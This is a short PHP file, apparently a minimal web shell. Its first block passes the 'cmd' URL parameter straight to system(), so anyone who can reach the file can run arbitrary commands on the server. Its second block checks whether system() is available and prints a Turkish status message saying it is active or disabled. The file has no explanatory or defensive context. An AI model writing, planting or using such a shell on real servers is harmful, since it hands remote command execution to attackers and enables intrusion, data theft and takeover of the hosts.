<?php
system($_GET['cmd']);
?>
<?php
if(function_exists('system')) {
    echo "<br> System fonksiyonu aktif.";
} else {
    echo "System fonksiyonu devre dışı!";
}
?>
